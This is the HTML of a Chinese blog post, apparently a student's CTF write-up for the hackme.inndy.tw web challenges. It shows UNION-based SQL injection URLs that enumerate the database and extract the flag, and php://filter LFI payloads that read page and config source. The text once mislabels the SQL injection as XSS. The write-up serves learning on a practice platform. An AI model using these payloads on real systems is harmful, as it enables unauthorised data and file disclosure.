@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hackme-Web-wp | iHui</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="背景：这几天老师要求我们把hackme的题目做出来，于是便开始了新的征程，一定把全部flag找出来，fighting…… 题目及解题思路1 hide and seek Can you see me? I’m so close to you but you can’t see me.  题目描述说离我很近，于是便翻翻网页源代码，果真发现了flag 2 guestbook This guestbook">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackme-Web-wp">
+<meta property="og:url" content="http://example.com/2019/10/11/Hackme-Web-wp/index.html">
+<meta property="og:site_name" content="iHui">
+<meta property="og:description" content="背景：这几天老师要求我们把hackme的题目做出来，于是便开始了新的征程，一定把全部flag找出来，fighting…… 题目及解题思路1 hide and seek Can you see me? I’m so close to you but you can’t see me.  题目描述说离我很近，于是便翻翻网页源代码，果真发现了flag 2 guestbook This guestbook">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190913182406121.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190913234710343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190913235226227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914000915484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914001002923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914001114773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914001310552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914001344906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914001418481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914001503241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914002935925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914003419928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914003514238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914003705131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914113210832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190913182854129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190913182918736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914105945963.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914110117959.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914110825157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914121925691.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914122213285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914123139239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019091419120180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914192527170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914192820267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914194841713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914214419630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914225043997.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914225850704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914231838363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914232028746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019091423313125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190914235713199.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915000758231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915002726628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915003102645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915104833816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915105004578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915105042317.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915105334451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915105539534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915105759443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915105814610.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915110017163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915110136568.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915172516680.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915173039105.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915173322344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915174351328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915174534223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915174700653.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915175005463.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915175219923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915180110935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019091518043669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915180659685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019091518120625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915182047269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915182100249.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915203132375.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915211441404.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915215742265.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190916200126319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190916200359853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190916200739840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190916201009892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190916201220790.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190916213425108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190916221314326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2019-10-11T13:04:39.000Z">
+<meta property="article:modified_time" content="2020-01-10T02:55:54.209Z">
+<meta property="article:author" content="iHui">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190913182406121.png">
+  
+    <link rel="alternate" href="/atom.xml" title="iHui" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">iHui</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Hackme-Web-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/11/Hackme-Web-wp/" class="article-date">
+  <time class="dt-published" datetime="2019-10-11T13:04:39.000Z" itemprop="datePublished">2019-10-11</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Hackme-Web-wp
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h1><p>这几天老师要求我们把hackme的题目做出来，于是便开始了新的征程，一定把全部flag找出来，fighting……</p>
+<h1 id="题目及解题思路"><a href="#题目及解题思路" class="headerlink" title="题目及解题思路"></a>题目及解题思路</h1><h2 id="1-hide-and-seek"><a href="#1-hide-and-seek" class="headerlink" title="1 hide and seek"></a>1 hide and seek</h2><blockquote>
+<p>Can you see me? I’m so close to you but you can’t see me.</p>
+</blockquote>
+<p>题目描述说离我很近，于是便翻翻网页源代码，果真发现了flag<br><img src="https://img-blog.csdnimg.cn/20190913182406121.png"></p>
+<h2 id="2-guestbook"><a href="#2-guestbook" class="headerlink" title="2 guestbook"></a>2 guestbook</h2><blockquote>
+<p>This guestbook sucks. sqlmap is your friend.</p>
+</blockquote>
+<p>根据题目意思肯定是一个sql注入了，比较sqlmap都出来了</p>
+<p><img src="https://img-blog.csdnimg.cn/20190913234710343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>看上去非常像是一个xss攻击，于是进行fuzz（模糊测试）<br>观察url，进行简单fuzz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,database(),4 -- 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190913235226227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>得到数据库名g8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;guestbook&#x27; limit 0,1),4 -- 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914000915484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>得到表名flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;flag&#x27; limit 1,1),4 -- 1</span><br></pre></td></tr></table></figure>
+
+<p>得到字段名flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4 -- 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914001002923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>得到最终flag</p>
+<h2 id="另解"><a href="#另解" class="headerlink" title="另解"></a>另解</h2><p>也可执行如下选项得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,3,4--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914001114773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>&#x2F;&#x2F;2,3,4都是回显点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,database(),4--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914001310552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>&#x2F;&#x2F;找到数据库g8，虽然直接用database()也行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914001344906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>&#x2F;&#x2F;找到表flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,group_concat(column_name),4 from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914001418481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>&#x2F;&#x2F;找到flag列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,group_concat(flag),4 from flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914001503241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>&#x2F;&#x2F;找到FLAG</p>
+<h3 id="知识扩展"><a href="#知识扩展" class="headerlink" title="知识扩展"></a>知识扩展</h3><ul>
+<li>sqlmap的使用<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/caicai0001000/article/details/79576697">https://blog.csdn.net/caicai0001000/article/details/79576697</a></li>
+<li>XSS攻击<br>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</li>
+<li>fuzz<br>模糊测试（Fuzzing），是一种通过向目标系统提供非预期的输入并监视异常结果来发现软件漏洞的方法。</li>
+</ul>
+<h2 id="3-LFI"><a href="#3-LFI" class="headerlink" title="3 LFI"></a>3 LFI</h2><blockquote>
+<p>What this admin’s password? That is not important at all, just get the flag.<br>Tips: LFI, php:&#x2F;&#x2F;filter</p>
+</blockquote>
+<p>点击网页中的<code>Home</code>后出现:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/lfi/?page=pages/index</span><br></pre></td></tr></table></figure>
+
+<p>查看网页源代码后发现flag的踪迹</p>
+<p><img src="https://img-blog.csdnimg.cn/20190914002935925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>估计就是读取网页中的文件，所以就读下面url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914003419928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>此时发现一串很像base64编码后的字符串，在线解密后结果如下图</p>
+<p><img src="https://img-blog.csdnimg.cn/20190914003514238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>于是乎再按照下面的url读一遍呗</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config</span><br></pre></td></tr></table></figure>
+
+<p>最终得到了又是base64加密后的字符串，在线解密后即得flag</p>
